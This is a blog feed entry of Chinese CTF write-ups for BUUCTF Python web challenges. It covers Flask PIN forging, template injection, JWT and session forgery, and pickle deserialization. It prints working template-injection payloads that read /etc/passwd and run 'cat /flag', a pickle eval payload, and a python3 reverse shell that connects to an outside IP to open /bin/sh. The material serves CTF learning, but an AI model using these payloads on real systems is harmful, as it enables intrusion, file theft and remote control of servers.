    <link href="http://ca0y1h.top/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python/</id>
    <published>2020-08-18T09:59:30.000Z</published>
    <updated>2020-09-17T05:28:18.864Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF刷题——Python">BUUCTF刷题——Python</h1><h2 id="GYCTF2020-flaskapp">GYCTF2020 flaskapp</h2><h3 id="考点">考点</h3><ul><li><p>Flask debug pin码安全</p><p><a href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a></p></li></ul><h3 id="解题">解题</h3><p>打开题目有一个hint界面，查看源码</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706152201.png" alt=""></p><p>意思应该是去伪造Flask pin然后执行命令。</p><p>先来验证一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[0].__init__&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706160510.png" alt=""></p><p>然后还要找到一个读文件的payload，发现eval不能用，用open可以读</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706160627.png" alt=""></p><p>接下来就是要获取6个关键参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">username # 用户名</span><br><span class="line"></span><br><span class="line">modname # flask.app</span><br><span class="line"></span><br><span class="line">getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) # Flask</span><br><span class="line"></span><br><span class="line">getattr(mod, &#39;__file__&#39;, None) # flask目录下的一个app.py的绝对路径</span><br><span class="line"></span><br><span class="line">uuid.getnode() # mac地址十进制</span><br><span class="line"></span><br><span class="line">get_machine_id() # &#x2F;etc&#x2F;machine-id</span><br></pre></td></tr></table></figure><p>第一个用户名可以通过<code>/etc/passwd</code>得到，即<code>flaskweb</code></p><p>第二个modname一般都是默认的flask.app</p><p>第三个也是默认的Flask</p><p>第四个是<code>app.py</code>的绝对路径，可以直接通过报错来获取</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706161050.png" alt=""></p><p>第四个mac地址如果在真实环境是从<code>/etc/machine-id</code>文件读取，如果是在docker下，是从<code>/sys/class/net/eth0/address</code>目录下读取，转换成十进制<code>2485410468126</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706161305.png" alt=""></p><blockquote><p>转换地址：<a href="https://www.vultr.com/resources/mac-converter/">https://www.vultr.com/resources/mac-converter/</a></p></blockquote><p>第五个通过读取<code>/proc/self/cgroup</code>获取machine-id：1408f836b0ca514d796cbf8960e45fa1</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706163205.png" alt=""></p><p>然后再上脚本跑出PIN码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#脚本出处：https://xz.aliyun.com/t/2553</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377957891&#x27;</span>,<span class="comment"># address</span></span><br><span class="line">    <span class="string">&#x27;e96996169e90130c1b6e2b3fb9af5b39abcacc1b1f84211a58e27854c3a1219e&#x27;</span><span class="comment"># machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706162426.png" alt=""></p><p>system好像被禁用了，换成popen函数</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706163643.png" alt=""></p><h2 id="RootersCTF2019-I-❤️-Flask">RootersCTF2019 I_❤️_Flask</h2><h2 id="CSCCTF-2019-Qual-FlaskLight">CSCCTF 2019 Qual FlaskLight</h2><h2 id="pasecactf-2019-flask-ssti">pasecactf_2019 flask_ssti</h2><h2 id="CISCN2019-华北赛区-Web2-ikun">CISCN2019 华北赛区 Web2 ikun</h2><h3 id="考点-v2">考点</h3><ul><li>逻辑漏洞</li><li>JWT伪造</li><li>pickle反序列化</li></ul><h3 id="解题-v2">解题</h3><p>python脚本寻找LV6商品所在页面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4186a81c-5092-4d1c-b2c3-6d753ef436c7.node3.buuoj.cn/shop?page=&#123;&#125;&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;_xsrf&quot;</span>: <span class="string">&quot;2|9abd3196|175f180123b348c52281c861b9ea6ba9|1593758159&quot;</span>,</span><br><span class="line">    <span class="string">&quot;JWT&quot;</span>: <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhMDFoIn0.xjww69DlZAtZw_26KzwvCZc&quot;</span></span><br><span class="line">           <span class="string">&quot;-WhNxACW3PuvxHlQQ2yg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;commodity_id&quot;</span>: <span class="string">&quot;2|1:0|10:1593758858|12:commodity_id|4:Nw&quot;</span></span><br><span class="line">                    <span class="string">&quot;==|42eb3fadf203ceac3f14f89b8e7a575d5350b31a29c08f6a939d099435027244 &quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">501</span>):</span><br><span class="line">    rq = requests.get(url=url.format(i), cookies=cookies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;/static/img/lv/lv6.png&quot;</span> <span class="keyword">in</span> rq.text:</span><br><span class="line">        print(url.format(i))</span><br></pre></td></tr></table></figure><p>跑出来的结果是<code>page=181</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703150520.png" alt=""></p><p>但是看到这个价格很显然是要通过某种漏洞来购买，先抓包，看到参数后想到两种办法，一是直接改价格，二是改折扣。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152451.png" alt=""></p><p>尝试之后发现改价格没有用，改折扣提示不是admin</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152637.png" style="zoom:50%;" /><p>这个地方就很自然想到要越权，修改密码处没有逻辑漏洞，但是Cookie中包含JWT，放到jwt.io网址上解析后：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152814.png" alt=""></p><p>如果想要伪造一个admin的JWT需要知道secret。感觉这个地方就有点脑洞了，要用<a href="https://github.com/brendan-rius/c-jwt-cracker">工具</a>去爆破，我还找了很久的注入点。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152940.png" alt=""></p><p>再去伪造admin的JWT</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703153100.png" alt=""></p><p>更改cookie的值</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703153207.png" alt=""></p><p>查看个人中心，出现了一个hint</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u8fd9\u7f51\u7ad9\u4e0d\u4ec5\u53ef\u4ee5\u4ee5\u8585\u7f8a\u6bdb\uff0c\u6211\u8fd8\u7559\u4e86\u4e2a\u540e\u95e8\uff0c\u5c31\u85cf\u5728\u006c\u0076\u0036\u91cc</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703154225.png" alt=""></p><p>查看源码发现源码包：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703153940.png" alt=""></p><p>题目提示了pickle，直接全局搜索，<code>Admin.py</code>有pickle反序列化漏洞</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703160455.png" alt=""></p><p>利用脚本生成payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure><p>将生成的payload放到隐藏的输入框里，只需将<code>hidden=&quot;hidden&quot;</code>删除即可。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703160604.png" alt=""></p><h2 id="SUCTF-2019-Pythonginx">SUCTF 2019 Pythonginx</h2><h2 id="WesternCTF2018-shring">WesternCTF2018 shring</h2><h3 id="考点-v3">考点</h3><h3 id="解题-v3">解题</h3><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="TODO">TODO</h3><h2 id="护网杯2018-easy-tornado">护网杯2018 easy_tornado</h2><h3 id="考点-v4">考点</h3><ul><li>tornado 模板注入</li></ul><h3 id="解题-v4">解题</h3><p>这道题很重要的一个地方就是观察url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;65cdf038-1123-4f28-aedb-3369e8c68049.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;eca90b16e91faf8d52c04e7ef7e7a8fc</span><br></pre></td></tr></table></figure><p>并且filehash=md5(cookie_secret+md5(filename))，所以要找到cookie_secret的值。</p><p>当不输入filehash参数的时候，url是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;65cdf038-1123-4f28-aedb-3369e8c68049.node3.buuoj.cn&#x2F;error?msg&#x3D;Error</span><br></pre></td></tr></table></figure><p>并且页面回显Error，这个就需要比较敏感的注意到这里是模板注入的点。</p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#3-Tornado">参考文章</a>用的就是handler.settings对象</p><blockquote><p>handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所有handler.settings就指向RequestHandler.application.settings了。</p></blockquote><p>所以传递<code>error?msg=&#123;&#123; handler.settings &#125;&#125;</code>得到cookie_secret。</p><h2 id="HCTF-2018-Hideandseek">HCTF 2018 Hideandseek</h2><h3 id="TODO-v2">TODO</h3><h2 id="CISCN2019-总决赛-Day1-Web3-Flask-Message-Board">[CISCN2019 总决赛 Day1 Web3]Flask Message Board</h2><h3 id="TODO-v3">TODO</h3><h2 id="HCTF2018-Admin">HCTF2018 Admin</h2><p>出题人writeup：<a href="https://www.ckj123.com/?p=147">https://www.ckj123.com/?p=147</a></p><h3 id="考点-v5">考点</h3><ul><li>Flask Session伪造</li><li>Unicode欺骗</li><li>条件竞争</li></ul><h3 id="解题-v5">解题</h3><h4 id="方法一-Unicode编码欺骗">方法一 Unicode编码欺骗</h4><p>结合改密码的功能，看一下<code>change</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br></pre></td></tr></table></figure><p>其中第6行的<code>strlower</code>是自己封装的一个函数，并没有使用Python的库函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>其中 <code>nodeprep</code> 来自 <code>twisted.words.protocols.jabber.xmpp_stringprep</code>。</p><p>并且在注册和登录的代码中都使用了这个函数，所以不能用<code>ADMIN</code>绕过。</p><p>这里有一篇文章讲到了nodeprep关于Unicode编码的问题：</p><blockquote><p><a href="https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e">https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e</a></p></blockquote><p>使用两次<code>nodeprep.prepare</code>函数会进行如下操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴬ -&gt; A -&gt; a</span><br></pre></td></tr></table></figure><blockquote><p>Unicode —&gt; 中文：<a href="https://tool.chinaz.com/tools/unicode.aspx">https://tool.chinaz.com/tools/unicode.aspx</a></p></blockquote><p>即第一次将其转换为大写，第二次将其转换为小写。</p><p>思路：</p><ul><li>注册用户ᴬdmin</li><li>登录用户ᴬdmin，变成Admin</li><li>修改密码Admin，更改了admin的密码</li></ul><h4 id="方法二-Flask-session-伪造">方法二 Flask session 伪造</h4><blockquote><p>原理：<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p><p>工具：<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p></blockquote><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619223051.png" alt=""></p><p>修改<code>name</code>为<code>admin</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;6604bc7a9890f6bf08233451da34826f785818ecb989720b4c7e7aa4f22105e0b28a5122c9e9b490f8c9609baa8efab128409afc0a7ce5ba93ccd50994d78d37&#39;, &#39;csrf_token&#39;: b&#39;135d7b0b615153fd276627d995e71a0026f75bb3&#39;, &#39;image&#39;: b&#39;mwPn&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;</span><br></pre></td></tr></table></figure><p>再对其进行encode操作：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619223440.png" alt=""></p><p>更改cookie的值：</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619223656.png" style="zoom:67%;" /><p>提交更改，刷新页面，成功获取flag~</p><h4 id="方法三-条件竞争">方法三 条件竞争</h4><blockquote><p><a href="https://tmr.js.org/p/3a03e44b/">https://tmr.js.org/p/3a03e44b/</a></p><p>不由的感叹这些人的脑子怎么这么好使。。。😂</p></blockquote><h2 id="BJDCTF-2nd-fake-google">BJDCTF 2nd fake google</h2><h3 id="考点-v6">考点</h3><ul><li>Flask SSTI 文件读取</li></ul><h3 id="解题-v6">解题</h3><p>这道题就是比较明显的Flask 模板注入漏洞了，也没有什么绕过，直接上payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%&#125;&#123;%%20if%20c.__name__&#x3D;&#x3D;%27catch_warnings%27%20%&#125;&#123;&#123;%20c.__init__.__globals__[%27__builtins__%27].eval(&quot;__import__(%27os%27).popen(%27cat%20&#x2F;flag%27).read()&quot;)%20&#125;&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125;</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Cookie-is-stable">BJDCTF2020 Cookie is stable</h2><h3 id="考点-v7">考点</h3><ul><li>Python Twig模板注入</li></ul><h3 id="解题-v7">解题</h3><p>和上题一样是模板注入，不过注入点在Cookie里</p><p>渲染引擎也换成了基于Python的Twig</p><p>从网上找到的 Twig poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id=""></h3><h2 id="V-N公开赛-CheckIn">V&amp;N公开赛 CheckIn</h2><h3 id="考点-v8">考点</h3><ul><li>反弹shell</li><li>文件描述符</li></ul><h3 id="解题-v8">解题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route(&#x27;/flag&#x27;)</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/shell&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>():</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -f flag.txt&quot;</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;app.py&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>shell路由可以执行命令，但是在执行命令之前flag.txt已经被删除了，并且不能回显命令执行的结果。</p><p>首先肯定是想到反弹一个shell，用BUU小号开一个Linux主机，尝试有bash、curl、nc、python -c等，但是这里测试后发现这些常用的命令都被禁了，无法反弹Shell。最后再换成python3就可以成功反弹shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc5fa49b-316a-47e1-8737-20050c013abe.node3.buuoj.cn&#x2F;shell?c&#x3D;python3%20-c%20%27import%20socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.2.25.118%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p&#x3D;subprocess.call([%22&#x2F;bin&#x2F;sh%22,%22-i%22]);%27</span><br></pre></td></tr></table></figure><p>接下来的一个考点就是通过文件描述符来恢复文件。</p><blockquote><p>什么是文件描述符</p><p>例如Python中，当我们open()函数打开一个文件时便创建了一个文件描述符，而后对这个文件描述符使用read()函数便是读取文件描述符中的内容，close()函数用于关闭/销毁这个文件描述符。</p><p>文件描述符储存在什么地方：</p><p><code>/proc/&lt;pid&gt;/fd/&lt;id&gt;</code></p></blockquote><p>查看<code>/proc</code>目录下的进程号</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708102353.png" alt=""></p><p>查看进程号等于10下面的fd目录</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708102509.png" alt=""></p><p>文件描述符等于3即为flag文件</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708102615.png" alt=""></p><h2 